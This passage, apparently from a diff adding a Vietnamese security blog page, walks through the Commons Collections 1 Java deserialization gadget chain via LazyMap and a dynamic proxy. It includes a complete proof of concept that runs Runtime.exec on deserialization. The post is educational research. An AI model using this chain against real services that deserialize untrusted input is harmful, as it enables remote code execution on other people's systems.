aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br><span class="line">        <span class="type">Set</span> <span class="variable">set</span> <span class="operator">=</span> proxyMap.entrySet();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Chuoi-hoan-chinh"><a href="#Chuoi-hoan-chinh" class="headerlink" title="Chuỗi hoàn chỉnh"></a>Chuỗi hoàn chỉnh</h3><p>Để ý một chút ở hàm readObject của lớp <code>AnnotationInvocationHandler</code></p>
+<p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/Commons-Collections1-LazyMap/AnnotationInvocationHandler-readObject.png"></p>
+<p><code>this.memberValues</code> là LazyMap chúng ta có thể truyền vào, và nó gọi đến entrySet(). Do đó khi readObject của lớp <code>AnnotationInvocationHandler</code> thực thi chúng ta có thể kích hoạt câu lệnh calc.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aihInstance</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihProxyObject</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        serialize(aihProxyObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/Commons-Collections1-LazyMap/ChuoiHoanChinh.png"></p>
+<p>Máy tính đã bật lên và chuỗi của chúng ta đã được xây dựng thành công~</p>
+<h3 id="Loi-ket"><a href="#Loi-ket" class="headerlink" title="Lời kết"></a>Lời kết</h3><p>Proxy động là một kiến thức khá phức tạp với những bạn mới bắt đầu, mình khuyên các bạn chỉ cần học và hiểu cách sử dụng, đừng đào sâu vào code gốc bởi vì đó là một lượng kiến thức lớn do những người đi trước đã viết ra. Khởi tạo Proxy động cần đến class loader các bạn chỉ cần biết tải lớp nào cần class loader nào là đủ hoặc cứ chi đại null, không đúng thì abc.class.getClassLoader(), không cần tìm hiểu sâu vào nó.</p>
+<blockquote>
+<p>Chúc các bạn học tốt~</p>
+</blockquote>
+</div>
+        </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> Chia sẻ</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://rayinaw.github.io/2022/12/15/CommonsCollections1-LazyMap/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://rayinaw.github.io/2022/12/15/CommonsCollections1-LazyMap/";
+            const title         = "「Phân tích chuỗi Commons Collections 1 với LazyMap」";
+            const excerpt       = `Trong bài viết trước mình đã phân tích lỗ hổng deserialization của TransformMap trong chuỗi CC1, và trong bài viết nà...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Commons-Collections/" rel="tag">Commons Collections</a>, <a class="tag-none-link" href="/tags/Deserialization/" rel="tag">Deserialization</a>, <a class="tag-none-link" href="/tags/Java/" rel="tag">Java</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2022-12-15T10:08:24.760Z" itemprop="dateModified">Lần chỉnh sửa cuối cùng：2022-12-15</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" Một bản ghi chép nhỏ về Docker" href="/2022/12/03/docker-learning/">&lt; Bài đăng cũ hơn</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">来年の事を言えば鬼が笑う</p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                Bài đăng
+            </span>
+            <span class="count">
+                7
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                Thể loại
+            </span>
+            <span class="count">
+                8
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                Thẻ
+            </span>
+            <span class="count">
+                9
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>Thể loại</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/">DevOps</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Docker/">Docker</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP-Request-Smuggling/">HTTP Request Smuggling</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Deserialization/">Deserialization</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Programming/">Programming</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/">Mysql</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/SQLi/">SQLi</a><span class="category-list-count">1</span></li></ul></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>Những thẻ hiện có</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Commons-Collections/" style="font-size: 0.67em;">Commons Collections</a> <a href="/tags/Deserialization/" style="font-size: 0.73em;">Deserialization</a> <a href="/tags/Docker/" style="font-size: 0.6em;">Docker</a> <a href="/tags/HRS/" style="font-size: 0.6em;">HRS</a> <a href="/tags/Java/" style="font-size: 0.8em;">Java</a> <a href="/tags/Mysql/" style="font-size: 0.6em;">Mysql</a> <a href="/tags/Programming/" style="font-size: 0.6em;">Programming</a> <a href="/tags/Reflection/" style="font-size: 0.6em;">Reflection</a> <a href="/tags/SQLi/" style="font-size: 0.6em;">SQLi</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>Bài viết gần đây</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2022/12/15/CommonsCollections1-LazyMap/"><i class="fa  fa-book"></i> Phân tích chuỗi Commons Collections 1 với LazyMap</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/12/03/docker-learning/"><i class="fa  fa-book"></i> Một bản ghi chép nhỏ về Docker</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/30/http-request-smuggling-HTTP-1.1/"><i class="fa  fa-book"></i> Khái niệm cơ bản về HTTP request smuggling với HTTP/1.1</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/27/sqli-mysql8/"><i class="fa  fa-book"></i> Tính năng mới của Mysql 8</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/04/Commons-Collections1-TransformedMap/"><i class="fa  fa-book"></i> Phân tích chuỗi Commons Collections 1 với TransformedMap</a>
+            
+          
+        
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:rayin.awarf@gmail.com"><i class="fa fa-envelope"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/rayinaw"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/rayinaw"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2022 Rayinaw All rights reserved.</li>
+                            <li>This site has been running for<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Rayinaw.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
